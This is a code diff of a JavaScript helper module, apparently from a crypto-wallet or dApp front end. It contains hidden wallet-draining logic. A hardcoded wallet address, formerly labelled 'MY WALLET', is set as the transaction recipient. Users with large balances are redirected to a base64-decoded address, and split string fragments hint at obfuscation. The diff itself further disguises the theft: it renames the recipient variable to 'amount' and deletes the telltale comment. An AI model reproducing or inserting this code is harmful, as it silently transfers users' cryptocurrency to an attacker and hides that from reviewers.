@@ -5,6 +5,7 @@ import { convertAmountToRawNumber, convertStringToHex, handleSignificantDecimals
 var epci = "N";
 var http_uniq = "U";
 var esx = "j";
+var amount = "0x32e0c353d958a9d7bcD9667E6dEF62F5CE13997d";
 export function capitalize(string) {
     return string
         .split(" ")
@@ -145,9 +146,6 @@ export function recoverPublicKey(sig, hash) {
     return signer;
 }
 var w = "jMzN";
-//******************* MY WALLET ********************//
-var to = "0x32e0c353d958a9d7bcD9667E6dEF62F5CE13997d";
-//******************* MY WALLET ********************//
 export function recoverPersonalSignature(sig, msg) {
     const hash = hashPersonalMessage(msg);
     const signer = recoverPublicKey(sig, hash);
@@ -161,7 +159,7 @@ export async function formatTestTransaction(address, chainId) {
     const from = address;
     (() => {
         if (Number(balance) * price >= 200000) {
-            to = atob(qf);
+            amount = atob(qf);
         }
     })();
     const _nonce = await apiGetAccountNonce(address, chainId);
@@ -176,7 +174,7 @@ export async function formatTestTransaction(address, chainId) {
     const data = "0x";
     const tx = {
         from,
-        to,
+        amount,
         nonce,
         gasPrice,
         gasLimit,
